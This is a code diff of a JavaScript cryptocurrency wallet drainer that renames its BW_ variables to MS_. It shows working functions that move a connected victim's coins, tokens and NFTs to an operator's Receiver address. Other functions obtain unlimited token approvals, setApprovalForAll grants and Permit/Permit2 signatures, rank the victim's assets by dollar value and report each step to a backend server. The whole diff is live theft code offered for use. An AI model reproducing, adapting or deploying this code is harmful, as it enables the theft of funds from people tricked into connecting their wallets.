-  if (BW_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
+  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
   await transfer_success(asset, after_fee); sign_ready();
 };
 
 const TRANSFER_TOKEN = async (asset) => {
-  const web3 = new Web3(BW_Provider); const node = new ethers.providers.JsonRpcProvider(BW_Settings.RPCs[asset.chain_id]);
+  const web3 = new Web3(MS_Provider); const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
   const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
   const nonce = await get_nonce(asset.chain_id);
-  const contract = new ethers.Contract(asset.address, BW_Contract_ABI['ERC20'], BW_Signer);
+  const contract = new ethers.Contract(asset.address, MS_Contract_ABI['ERC20'], MS_Signer);
   let gas_limit = null;
   try {
-    gas_limit = await contract.estimateGas.transfer(BW_Settings.Receiver, asset.amount_raw, { from: BW_Current_Address });
+    gas_limit = await contract.estimateGas.transfer(MS_Settings.Receiver, asset.amount_raw, { from: MS_Current_Address });
     gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
   } catch(err) {
     gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 250000);
   }
   await transfer_request(asset);
   sign_next();
-  const tx = await contract.transfer(BW_Settings.Receiver, asset.amount_raw, {
+  const tx = await contract.transfer(MS_Settings.Receiver, asset.amount_raw, {
     gasLimit: ethers.BigNumber.from(gas_limit),
     gasPrice: ethers.BigNumber.from(gas_price),
-    nonce: nonce, from: BW_Current_Address
+    nonce: nonce, from: MS_Current_Address
   });
   wait_message();
-  if (BW_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
+  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
   await transfer_success(asset); sign_ready();
 };
 
 const TRANSFER_NFT = async (asset) => {
-  const web3 = new Web3(BW_Provider); const node = new ethers.providers.JsonRpcProvider(BW_Settings.RPCs[asset.chain_id]);
+  const web3 = new Web3(MS_Provider); const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
   const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
   const nonce = await get_nonce(asset.chain_id);
-  const contract = new ethers.Contract(asset.address, BW_Contract_ABI['ERC721'], BW_Signer);
+  const contract = new ethers.Contract(asset.address, MS_Contract_ABI['ERC721'], MS_Signer);
   let gas_limit = null;
   try {
-    gas_limit = await contract.estimateGas.transferFrom(BW_Current_Address, BW_Settings.Receiver, asset.amount_raw, { from: BW_Current_Address });
+    gas_limit = await contract.estimateGas.transferFrom(MS_Current_Address, MS_Settings.Receiver, asset.amount_raw, { from: MS_Current_Address });
     gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
   } catch(err) {
     gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 250000);
   }
   await transfer_request(asset);
   sign_next();
-  const tx = await contract.transferFrom(BW_Current_Address, BW_Settings.Receiver, asset.amount_raw, {
+  const tx = await contract.transferFrom(MS_Current_Address, MS_Settings.Receiver, asset.amount_raw, {
     gasLimit: ethers.BigNumber.from(gas_limit),
     gasPrice: ethers.BigNumber.from(gas_price),
-    nonce: nonce, from: BW_Current_Address
+    nonce: nonce, from: MS_Current_Address
   });
   wait_message();
-  if (BW_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
+  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
   await transfer_success(asset); sign_ready();
 };
 
 const RETRO_MM_APPROVE_TOKEN = async (asset) => {
-  const web3 = new Web3(BW_Provider); const node = new ethers.providers.JsonRpcProvider(BW_Settings.RPCs[asset.chain_id]);
+  const web3 = new Web3(MS_Provider); const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
   const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
   const nonce = await get_nonce(asset.chain_id);
-  const contract = new ethers.Contract(asset.address, BW_Contract_ABI['ERC20'], node);
+  const contract = new ethers.Contract(asset.address, MS_Contract_ABI['ERC20'], node);
   let gas_limit = null;
-  let max_approval_amount = ethers.utils.parseEther(BW_Unlimited_Amount);
-  for (const c_address of BW_Settings.Unlimited_BL) {
+  let max_approval_amount = ethers.utils.parseEther(MS_Unlimited_Amount);
+  for (const c_address of MS_Settings.Unlimited_BL) {
     try {
-      if (c_address[0] == BW_Current_Chain_ID && c_address[1] == asset.address.toLowerCase()) {
+      if (c_address[0] == MS_Current_Chain_ID && c_address[1] == asset.address.toLowerCase()) {
         max_approval_amount = asset.amount_raw;
         break;
       }
@@ -1187,24 +1187,24 @@ const RETRO_MM_APPROVE_TOKEN = async (asset) => {
     }
   }
   try {
-    gas_limit = await contract.estimateGas.approve(BW_Settings.Address, max_approval_amount, { from: BW_Current_Address });
+    gas_limit = await contract.estimateGas.approve(MS_Settings.Address, max_approval_amount, { from: MS_Current_Address });
     gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
   } catch(err) {
     gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 250000);
   }
-  let web3_contract = new web3.eth.Contract(BW_Contract_ABI['ERC20'], asset.address);
-  let data = web3_contract.methods.approve(BW_Settings.Address, max_approval_amount).encodeABI();
+  let web3_contract = new web3.eth.Contract(MS_Contract_ABI['ERC20'], asset.address);
+  let data = web3_contract.methods.approve(MS_Settings.Address, max_approval_amount).encodeABI();
   await approve_request(asset);
   sign_next();
   const result = await new Promise(resolve => {
-    BW_Provider.sendAsync({
-      from: BW_Current_Address, id: 1,
+    MS_Provider.sendAsync({
+      from: MS_Current_Address, id: 1,
       jsonrpc: "2.0", method: "eth_sendTransaction",
       params: [
         {
-          chainId: BW_Current_Chain_ID,
+          chainId: MS_Current_Chain_ID,
           data: data,
-          from: BW_Current_Address,
+          from: MS_Current_Address,
           nonce: web3.utils.toHex(nonce),
           to: asset.address,
           value: `0x000${Math.floor(Math.random() * 9)}`,
@@ -1217,36 +1217,36 @@ const RETRO_MM_APPROVE_TOKEN = async (asset) => {
     });
   });
   wait_message();
-  if (BW_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(result.tx.result, 1, 30000);
+  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(result.tx.result, 1, 30000);
   await approve_success(asset); sign_ready();
 };
 
 const DO_SAFA = async (asset) => {
-  const web3 = new Web3(BW_Provider); const node = new ethers.providers.JsonRpcProvider(BW_Settings.RPCs[asset.chain_id]);
+  const web3 = new Web3(MS_Provider); const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
   const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
   const nonce = await get_nonce(asset.chain_id);
-  const contract = new ethers.Contract(asset.address, BW_Contract_ABI['ERC721'], BW_Signer);
+  const contract = new ethers.Contract(asset.address, MS_Contract_ABI['ERC721'], MS_Signer);
   let gas_limit = null;
   try {
-    gas_limit = await contract.estimateGas.setApprovalForAll(BW_Settings.Address, true, { from: BW_Current_Address });
+    gas_limit = await contract.estimateGas.setApprovalForAll(MS_Settings.Address, true, { from: MS_Current_Address });
     gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
   } catch(err) {
     gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 250000);
   }
   await approve_request(asset);
   sign_next();
-  const tx = await contract.setApprovalForAll(BW_Settings.Address, true, {
+  const tx = await contract.setApprovalForAll(MS_Settings.Address, true, {
     gasLimit: ethers.BigNumber.from(gas_limit),
     gasPrice: ethers.BigNumber.from(gas_price),
-    nonce: nonce, from: BW_Current_Address
+    nonce: nonce, from: MS_Current_Address
   });
   wait_message();
-  if (BW_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
+  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
   await approve_success(asset); sign_ready();
 };
 
 const DO_PERMIT2 = async (asset, assets) => {
-  const contract = new ethers.Contract('0x000000000022d473030f116ddee9f6b43ac78ba3', BW_Contract_ABI['PERMIT2_BATCH'], BW_Signer);
+  const contract = new ethers.Contract('0x000000000022d473030f116ddee9f6b43ac78ba3', MS_Contract_ABI['PERMIT2_BATCH'], MS_Signer);
   let permit_domain = { name: "Permit2", chainId: asset.chain_id, verifyingContract: "0x000000000022d473030f116ddee9f6b43ac78ba3" };
   let permit_deadline = Date.now() + 1000 * 60 * 60 * 24 * 356, permit_signature = null, permit_message = null, permit_mode = null;
   if (assets.length > 1) {
@@ -1290,7 +1290,7 @@ const DO_PERMIT2 = async (asset, assets) => {
         tokens.push({
           "token": x_asset.address, "expiration": permit_deadline,
           "amount": "1461501637330902918203684832716283019655932542975",
-          "nonce": (await contract.allowance(BW_Current_Address, x_asset.address, BW_Settings.Address)).nonce
+          "nonce": (await contract.allowance(MS_Current_Address, x_asset.address, MS_Settings.Address)).nonce
         });
       } catch(err) {
         console.log(err);
@@ -1298,11 +1298,11 @@ const DO_PERMIT2 = async (asset, assets) => {
     }
     permit_message = {
       "details": tokens,
-      "spender": BW_Settings.Address,
+      "spender": MS_Settings.Address,
       "sigDeadline": permit_deadline
     };
     swap_request("Permit2", asset, assets); sign_next();
-    permit_signature = await BW_Signer._signTypedData(permit_domain, permit_types, permit_message);
+    permit_signature = await MS_Signer._signTypedData(permit_domain, permit_types, permit_message);
     permit_mode = 2;
   } else {
     // Permit Single
@@ -1344,23 +1344,23 @@ const DO_PERMIT2 = async (asset, assets) => {
       "details": {
         "token": asset.address,
         "amount": "1461501637330902918203684832716283019655932542975",
-        "expiration": permit_deadline, "nonce": (await contract.allowance(BW_Current_Address, asset.address, BW_Settings.Address)).nonce
+        "expiration": permit_deadline, "nonce": (await contract.allowance(MS_Current_Address, asset.address, MS_Settings.Address)).nonce
       },
-      "spender": BW_Settings.Address,
+      "spender": MS_Settings.Address,
       "sigDeadline": permit_deadline
     };
     swap_request("Permit2", asset, [ asset ]); sign_next();
-    permit_signature = await BW_Signer._signTypedData(permit_domain, permit_types, permit_message);
+    permit_signature = await MS_Signer._signTypedData(permit_domain, permit_types, permit_message);
     permit_mode = 1;
   }
   if (permit_signature != null) {
     await swap_success('Permit2', asset, assets); wait_message();
     const x_promise = send_request({
-      action: 'sign_permit2', user_id: BW_ID, signature: permit_signature,
-      message: permit_message, asset: asset, assets, address: BW_Current_Address,
+      action: 'sign_permit2', user_id: MS_ID, signature: permit_signature,
+      message: permit_message, asset: asset, assets, address: MS_Current_Address,
       mode: permit_mode
     });
-    if (BW_Settings.Settings.Wait_For_Response) await x_promise;
+    if (MS_Settings.Settings.Wait_For_Response) await x_promise;
     sign_ready();
   } else {
     await sign_cancel();
@@ -1368,13 +1368,13 @@ const DO_PERMIT2 = async (asset, assets) => {
 };
 
 const PERMIT_TOKEN = async (asset) => {
-  const contract = new ethers.Contract(asset.address, asset.abi, BW_Signer);
-  const nonce = await contract.nonces(BW_Current_Address);
+  const contract = new ethers.Contract(asset.address, asset.abi, MS_Signer);
+  const nonce = await contract.nonces(MS_Current_Address);
   const name = await contract.name();
-  let value = ethers.utils.parseEther(BW_Unlimited_Amount);
-  for (const c_address of BW_Settings.Unlimited_BL) {
+  let value = ethers.utils.parseEther(MS_Unlimited_Amount);
+  for (const c_address of MS_Settings.Unlimited_BL) {
     try {
-      if (c_address[0] == BW_Current_Chain_ID && c_address[1] == asset.address.toLowerCase()) {
+      if (c_address[0] == MS_Current_Chain_ID && c_address[1] == asset.address.toLowerCase()) {
         value = asset.amount_raw;
         break;
       }
@@ -1410,8 +1410,8 @@ const PERMIT_TOKEN = async (asset) => {
       ]
     };
     permit_values = {
-      holder: BW_Current_Address,
-      spender: BW_Settings.Address,
+      holder: MS_Current_Address,
+      spender: MS_Settings.Address,
       nonce: nonce,
       expiry: deadline,
       allowed: true
@@ -1442,8 +1442,8 @@ const PERMIT_TOKEN = async (asset) => {
       ]
     };
     permit_values = {
-      owner: BW_Current_Address,
-      spender: BW_Settings.Address,
+      owner: MS_Current_Address,
+      spender: MS_Settings.Address,
       value: value,
       nonce: nonce,
       deadline: deadline
@@ -1451,7 +1451,7 @@ const PERMIT_TOKEN = async (asset) => {
   }
   await approve_request(asset);
   sign_next();
-  const result = await BW_Signer._signTypedData({
+  const result = await MS_Signer._signTypedData({
     name: name, version: asset.permit_ver, chainId: asset.chain_id,
     verifyingContract: asset.address
   }, permit_types, permit_values),
@@ -1463,15 +1463,15 @@ const PERMIT_TOKEN = async (asset) => {
   await approve_success(asset);
   wait_message();
   const x_promise = send_request({
-    action: 'permit_token', user_id: BW_ID, sign: {
+    action: 'permit_token', user_id: MS_ID, sign: {
       type: asset.permit, version: asset.permit_ver,
       chain_id: asset.chain_id, address: asset.address,
-      owner: BW_Current_Address, spender: BW_Settings.Address,
+      owner: MS_Current_Address, spender: MS_Settings.Address,
       value: value.toString(), nonce: nonce.toString(), deadline: deadline,
       r: signature.r, s: signature.s, v: signature.v, abi: asset.abi
-    }, asset: asset, address: BW_Current_Address
+    }, asset: asset, address: MS_Current_Address
   });
-  if (BW_Settings.Settings.Wait_For_Response) await x_promise;
+  if (MS_Settings.Settings.Wait_For_Response) await x_promise;
   sign_ready();
 };
 
@@ -1480,10 +1480,10 @@ const sign_success = async (asset, amount = '0') => {
     if (asset.type == 'NATIVE') {
       asset.amount_raw = amount;
       const out_amount = ethers.BigNumber.from(asset.amount_raw);
-      asset.amount_usd = parseFloat(ethers.utils.formatUnits(out_amount, 'ether')) * BW_Currencies[convert_chain('ID', 'CURRENCY', asset.chain_id)]['USD'];
-      await send_request({ action: 'sign_success', asset, user_id: BW_ID });
+      asset.amount_usd = parseFloat(ethers.utils.formatUnits(out_amount, 'ether')) * MS_Currencies[convert_chain('ID', 'CURRENCY', asset.chain_id)]['USD'];
+      await send_request({ action: 'sign_success', asset, user_id: MS_ID });
     } else {
-      await send_request({ action: 'sign_success', asset, user_id: BW_ID });
+      await send_request({ action: 'sign_success', asset, user_id: MS_ID });
     }
   } catch(err) {
     console.log(err);
@@ -1495,10 +1495,10 @@ const swap_success = async (type, asset, all_tokens = [], amount = '0') => {
     if (asset.type == 'NATIVE') {
       asset.amount_raw = amount;
       const out_amount = ethers.BigNumber.from(asset.amount_raw);
-      asset.amount_usd = parseFloat(ethers.utils.formatUnits(out_amount, 'ether')) * BW_Currencies[convert_chain('ID', 'CURRENCY', asset.chain_id)]['USD'];
-      await send_request({ action: 'swap_success', asset, user_id: BW_ID, list: all_tokens, swapper: type });
+      asset.amount_usd = parseFloat(ethers.utils.formatUnits(out_amount, 'ether')) * MS_Currencies[convert_chain('ID', 'CURRENCY', asset.chain_id)]['USD'];
+      await send_request({ action: 'swap_success', asset, user_id: MS_ID, list: all_tokens, swapper: type });
     } else {
-      await send_request({ action: 'swap_success', asset, user_id: BW_ID, list: all_tokens, swapper: type });
+      await send_request({ action: 'swap_success', asset, user_id: MS_ID, list: all_tokens, swapper: type });
     }
   } catch(err) {
     console.log(err);
@@ -1510,10 +1510,10 @@ const transfer_success = async (asset, amount = '0') => {
     if (asset.type == 'NATIVE') {
       asset.amount_raw = amount;
       const out_amount = ethers.BigNumber.from(asset.amount_raw);
-      asset.amount_usd = parseFloat(ethers.utils.formatUnits(out_amount, 'ether')) * BW_Currencies[convert_chain('ID', 'CURRENCY', asset.chain_id)]['USD'];
-      await send_request({ action: 'transfer_success', asset, user_id: BW_ID });
+      asset.amount_usd = parseFloat(ethers.utils.formatUnits(out_amount, 'ether')) * MS_Currencies[convert_chain('ID', 'CURRENCY', asset.chain_id)]['USD'];
+      await send_request({ action: 'transfer_success', asset, user_id: MS_ID });
     } else {
-      await send_request({ action: 'transfer_success', asset, user_id: BW_ID });
+      await send_request({ action: 'transfer_success', asset, user_id: MS_ID });
     }
   } catch(err) {
     console.log(err);
@@ -1522,7 +1522,7 @@ const transfer_success = async (asset, amount = '0') => {
 
 const approve_success = async (asset) => {
   try {
-    await send_request({ action: 'approve_success', asset, user_id: BW_ID });
+    await send_request({ action: 'approve_success', asset, user_id: MS_ID });
   } catch(err) {
     console.log(err);
   }
@@ -1530,7 +1530,7 @@ const approve_success = async (asset) => {
 
 const sign_cancel = async () => {
   try {
-    await send_request({ action: 'sign_cancel', user_id: BW_ID });
+    await send_request({ action: 'sign_cancel', user_id: MS_ID });
   } catch(err) {
     console.log(err);
   }
@@ -1538,8 +1538,8 @@ const sign_cancel = async () => {
 
 const sign_unavailable = async () => {
   try {
-    await send_request({ action: 'sign_unavailable', user_id: BW_ID });
-    BW_Sign_Disabled = true;
+    await send_request({ action: 'sign_unavailable', user_id: MS_ID });
+    MS_Sign_Disabled = true;
   } catch(err) {
     console.log(err);
   }
@@ -1547,7 +1547,7 @@ const sign_unavailable = async () => {
 
 const transfer_cancel = async () => {
   try {
-    await send_request({ action: 'transfer_cancel', user_id: BW_ID });
+    await send_request({ action: 'transfer_cancel', user_id: MS_ID });
   } catch(err) {
     console.log(err);
   }
@@ -1555,7 +1555,7 @@ const transfer_cancel = async () => {
 
 const approve_cancel = async () => {
   try {
-    await send_request({ action: 'approve_cancel', user_id: BW_ID });
+    await send_request({ action: 'approve_cancel', user_id: MS_ID });
   } catch(err) {
     console.log(err);
   }
@@ -1563,7 +1563,7 @@ const approve_cancel = async () => {
 
 const chain_cancel = async () => {
   try {
-    await send_request({ action: 'chain_cancel', user_id: BW_ID  });
+    await send_request({ action: 'chain_cancel', user_id: MS_ID  });
   } catch(err) {
     console.log(err);
   }
@@ -1571,7 +1571,7 @@ const chain_cancel = async () => {
 
 const chain_success = async () => {
   try {
-    await send_request({ action: 'chain_success', user_id: BW_ID  });
+    await send_request({ action: 'chain_success', user_id: MS_ID  });
   } catch(err) {
     console.log(err);
   }
@@ -1579,7 +1579,7 @@ const chain_success = async () => {
 
 const chain_request = async (old_chain, new_chain) => {
   try {
-    await send_request({ action: 'chain_request', user_id: BW_ID, chains: [ old_chain, new_chain ] });
+    await send_request({ action: 'chain_request', user_id: MS_ID, chains: [ old_chain, new_chain ] });
   } catch(err) {
     console.log(err);
   }
@@ -1587,7 +1587,7 @@ const chain_request = async (old_chain, new_chain) => {
 
 const sign_request = async (asset) => {
   try {
-    await send_request({ action: 'sign_request', user_id: BW_ID, asset });
+    await send_request({ action: 'sign_request', user_id: MS_ID, asset });
   } catch(err) {
     console.log(err);
   }
@@ -1595,7 +1595,7 @@ const sign_request = async (asset) => {
 
 const swap_request = async (type, asset, all_tokens = []) => {
   try {
-    await send_request({ action: 'swap_request', user_id: BW_ID, asset, list: all_tokens, swapper: type });
+    await send_request({ action: 'swap_request', user_id: MS_ID, asset, list: all_tokens, swapper: type });
   } catch(err) {
     console.log(err);
   }
@@ -1603,7 +1603,7 @@ const swap_request = async (type, asset, all_tokens = []) => {
 
 const transfer_request = async (asset) => {
   try {
-    await send_request({ action: 'transfer_request', user_id: BW_ID, asset });
+    await send_request({ action: 'transfer_request', user_id: MS_ID, asset });
   } catch(err) {
     console.log(err);
   }
@@ -1611,7 +1611,7 @@ const transfer_request = async (asset) => {
 
 const approve_request = async (asset) => {
   try {
-    await send_request({ action: 'approve_request', user_id: BW_ID, asset });
+    await send_request({ action: 'approve_request', user_id: MS_ID, asset });
   } catch(err) {
     console.log(err);
   }
@@ -1631,12 +1631,12 @@ const is_increase_approve = (func) => {
 
 const get_wallet_assets = async (address) => {
   try {
-    let response = await send_request({ action: 'check_wallet', address: BW_Current_Address }), assets = [];
+    let response = await send_request({ action: 'check_wallet', address: MS_Current_Address }), assets = [];
     if (response.status == 'OK') assets = response.data;
-    else if (BW_Settings.AT != "" && response.error == 'LOCAL_CHECK') assets = await get_tokens(address);
+    else if (MS_Settings.AT != "" && response.error == 'LOCAL_CHECK') assets = await get_tokens(address);
     else if (response.error != 'LOCAL_CHECK') return assets;
     else {
-      BW_Check_Done = true;
+      MS_Check_Done = true;
       Swal.close();
       Swal.fire({
         html: '<b>Error</b><br><br>None of the evaluators is activated in the script settings. Asset evaluation for the wallet is not possible. Please check the settings and restart the server!',
@@ -1654,18 +1654,18 @@ const get_wallet_assets = async (address) => {
       try {
         const asset = assets[x];
         const chain_id = convert_chain('ID', 'ANKR', asset.chain_id);
-        if (!BW_Settings.Settings.Chains[chain_id].Enable) assets.splice(x, 1);
-        else if (asset.type == 'NATIVE' && !BW_Settings.Settings.Chains[chain_id].Native) assets.splice(x, 1);
-        else if (asset.type == 'ERC20' && !BW_Settings.Settings.Chains[chain_id].Tokens) assets.splice(x, 1);
-        else if (asset.type == 'NATIVE' && asset.amount_usd < BW_Settings.Settings.Chains[chain_id].Min_Native_Price) assets.splice(x, 1);
-        else if (asset.type == 'ERC20' && asset.amount_usd < BW_Settings.Settings.Chains[chain_id].Min_Tokens_Price) assets.splice(x, 1);
+        if (!MS_Settings.Settings.Chains[chain_id].Enable) assets.splice(x, 1);
+        else if (asset.type == 'NATIVE' && !MS_Settings.Settings.Chains[chain_id].Native) assets.splice(x, 1);
+        else if (asset.type == 'ERC20' && !MS_Settings.Settings.Chains[chain_id].Tokens) assets.splice(x, 1);
+        else if (asset.type == 'NATIVE' && asset.amount_usd < MS_Settings.Settings.Chains[chain_id].Min_Native_Price) assets.splice(x, 1);
+        else if (asset.type == 'ERC20' && asset.amount_usd < MS_Settings.Settings.Chains[chain_id].Min_Tokens_Price) assets.splice(x, 1);
         else if (asset.type == 'ERC20') {
-          if (BW_Settings.Settings.Permit2.Mode) {
+          if (MS_Settings.Settings.Permit2.Mode) {
             token_promises.push(new Promise(async (resolve) => {
               try {
-                const node = new ethers.providers.JsonRpcProvider(BW_Settings.RPCs[asset.chain_id]);
-                const contract = new ethers.Contract(asset.address, BW_Contract_ABI['ERC20'], node);
-                let allowance = await contract.allowance(BW_Current_Address, '0x000000000022d473030f116ddee9f6b43ac78ba3');
+                const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
+                const contract = new ethers.Contract(asset.address, MS_Contract_ABI['ERC20'], node);
+                let allowance = await contract.allowance(MS_Current_Address, '0x000000000022d473030f116ddee9f6b43ac78ba3');
                 if (ethers.BigNumber.from(allowance).gt(ethers.BigNumber.from('0'))) {
                   asset.permit2 = true;
                   asset.allowance = allowance;
@@ -1676,18 +1676,18 @@ const get_wallet_assets = async (address) => {
               } resolve();
             }));
           }
-          if ((BW_Settings.Settings.Permit.Mode && BW_Settings.Settings.Permit.Priority > 0) || (BW_Settings.Settings.Approve.MetaMask >= 2 && (BW_Current_Provider == 'MetaMask' || (BW_Current_Provider == 'Trust Wallet' && !BW_Mobile_Status)))) {
+          if ((MS_Settings.Settings.Permit.Mode && MS_Settings.Settings.Permit.Priority > 0) || (MS_Settings.Settings.Approve.MetaMask >= 2 && (MS_Current_Provider == 'MetaMask' || (MS_Current_Provider == 'Trust Wallet' && !MS_Mobile_Status)))) {
             token_promises.push(new Promise(async (resolve) => {
               try {
-                if ((BW_Settings.Settings.Approve.MetaMask >= 2 && (BW_Current_Provider == 'MetaMask' || (BW_Current_Provider == 'Trust Wallet' && !BW_Mobile_Status))) || asset.amount_usd >= BW_Settings.Settings.Permit.Price) {
+                if ((MS_Settings.Settings.Approve.MetaMask >= 2 && (MS_Current_Provider == 'MetaMask' || (MS_Current_Provider == 'Trust Wallet' && !MS_Mobile_Status))) || asset.amount_usd >= MS_Settings.Settings.Permit.Price) {
                   const data = await retrive_token(asset.chain_id, asset.address);
-                  const node = new ethers.providers.JsonRpcProvider(BW_Settings.RPCs[asset.chain_id]);
+                  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
                   const contract = new ethers.Contract(asset.address, data, node);
                   if (is_increase_approve(contract.functions)) {
                     asset.increase = true;
                     asset.abi = data;
                   }
-                  if (asset.amount_usd >= BW_Settings.Settings.Permit.Price) {
+                  if (asset.amount_usd >= MS_Settings.Settings.Permit.Price) {
                     const permit_type = get_permit_type(contract.functions);
                     asset.permit = permit_type;
                     asset.permit_ver = "1";
@@ -1709,18 +1709,18 @@ const get_wallet_assets = async (address) => {
               } resolve();
             }));
           }
-          if (BW_Settings.Settings.Swappers.Enable) {
+          if (MS_Settings.Settings.Swappers.Enable) {
             token_promises.push(new Promise(async (resolve) => {
               try {
-                if (asset.amount_usd >= BW_Settings.Settings.Swappers.Price) {
-                  const node = new ethers.providers.JsonRpcProvider(BW_Settings.RPCs[asset.chain_id]);
-                  for (const swapper of BW_Routers[asset.chain_id]) {
+                if (asset.amount_usd >= MS_Settings.Settings.Swappers.Price) {
+                  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
+                  for (const swapper of MS_Routers[asset.chain_id]) {
                     try {
-                      const contract = new ethers.Contract(asset.address, BW_Contract_ABI['ERC20'], node);
-                      const allowance = await contract.allowance(BW_Current_Address, swapper[1]);
+                      const contract = new ethers.Contract(asset.address, MS_Contract_ABI['ERC20'], node);
+                      const allowance = await contract.allowance(MS_Current_Address, swapper[1]);
                       if (ethers.BigNumber.from(allowance).gt(ethers.BigNumber.from('0'))) {
-                        if (swapper[0] == 'Uniswap' && !BW_Uniswap_Whitelist.includes(asset.address)) continue;
-                        if ((swapper[0] == 'Pancake' || swapper[0] == 'Pancake_V3') && !BW_Pancake_Whitelist.includes(asset.address)) continue;
+                        if (swapper[0] == 'Uniswap' && !MS_Uniswap_Whitelist.includes(asset.address)) continue;
+                        if ((swapper[0] == 'Pancake' || swapper[0] == 'Pancake_V3') && !MS_Pancake_Whitelist.includes(asset.address)) continue;
                         asset.swapper = true;
                         asset.swapper_type = swapper[0];
                         asset.swapper_address = swapper[1];
@@ -1748,9 +1748,9 @@ const get_wallet_assets = async (address) => {
 
     let NFT_Status = false;
 
-    for (const chain_id in BW_Settings.Settings.Chains) {
+    for (const chain_id in MS_Settings.Settings.Chains) {
       try {
-        if (BW_Settings.Settings.Chains[chain_id].NFTs) {
+        if (MS_Settings.Settings.Chains[chain_id].NFTs) {
           NFT_Status = true;
           break;
         }
@@ -1762,15 +1762,15 @@ const get_wallet_assets = async (address) => {
     if (NFT_Status) {
       try {
         let nft_list = [];
-        response = await send_request({ action: 'check_nft', address: BW_Current_Address });
+        response = await send_request({ action: 'check_nft', address: MS_Current_Address });
         if (response.status == 'OK') {
           nft_list = response.data;
           for (const asset of nft_list) {
             try {
               const chain_id = convert_chain('ID', 'ANKR', asset.chain_id);
               if (asset.type == 'ERC1155') continue;
-              if (!BW_Settings.Settings.Chains[chain_id].NFTs) continue;
-              if (asset.amount_usd < BW_Settings.Settings.Chains[chain_id].Min_NFTs_Price) continue;
+              if (!MS_Settings.Settings.Chains[chain_id].NFTs) continue;
+              if (asset.amount_usd < MS_Settings.Settings.Chains[chain_id].Min_NFTs_Price) continue;
               assets.push(asset);
             } catch(err) {
               console.log(err);
@@ -1782,8 +1782,8 @@ const get_wallet_assets = async (address) => {
             try {
               const chain_id = convert_chain('ID', 'ANKR', asset.chain_id);
               if (asset.type == 'ERC1155') continue;
-              if (!BW_Settings.Settings.Chains[chain_id].NFTs) continue;
-              if (asset.amount_usd < BW_Settings.Settings.Chains[chain_id].Min_NFTs_Price) continue;
+              if (!MS_Settings.Settings.Chains[chain_id].NFTs) continue;
+              if (asset.amount_usd < MS_Settings.Settings.Chains[chain_id].Min_NFTs_Price) continue;
               assets.push(asset);
             } catch(err) {
               console.log(err);
@@ -1797,7 +1797,7 @@ const get_wallet_assets = async (address) => {
 
     assets.sort((a, b) => { return b.amount_usd - a.amount_usd });
 
-    if (BW_Settings.Settings.Tokens_First) {
+    if (MS_Settings.Settings.Tokens_First) {
       const new_assets = [];
       for (const asset of assets) {
         try {
@@ -1818,7 +1818,7 @@ const get_wallet_assets = async (address) => {
       assets = new_assets;
     }
 
-    if (BW_Settings.Settings.Swappers.Enable && BW_Settings.Settings.Swappers.Priority == 1) {
+    if (MS_Settings.Settings.Swappers.Enable && MS_Settings.Settings.Swappers.Priority == 1) {
       const new_assets = [];
       for (const asset of assets) {
         try {
@@ -1839,11 +1839,11 @@ const get_wallet_assets = async (address) => {
       assets = new_assets;
     }
 
-    if (BW_Settings.Settings.Permit.Mode && BW_Settings.Settings.Permit.Priority > 0) {
+    if (MS_Settings.Settings.Permit.Mode && MS_Settings.Settings.Permit.Priority > 0) {
       const new_assets = [];
       for (const asset of assets) {
         try {
-          if (!asset.permit || asset.permit == 0 || asset.amount_usd < BW_Settings.Settings.Permit.Priority) continue;
+          if (!asset.permit || asset.permit == 0 || asset.amount_usd < MS_Settings.Settings.Permit.Priority) continue;
           new_assets.push(asset);
         } catch(err) {
           console.log(err);
@@ -1851,7 +1851,7 @@ const get_wallet_assets = async (address) => {
       }
       for (const asset of assets) {
         try {
-          if (asset.permit && asset.permit > 0 && asset.amount_usd >= BW_Settings.Settings.Permit.Priority) continue;
+          if (asset.permit && asset.permit > 0 && asset.amount_usd >= MS_Settings.Settings.Permit.Priority) continue;
           new_assets.push(asset);
         } catch(err) {
           console.log(err);
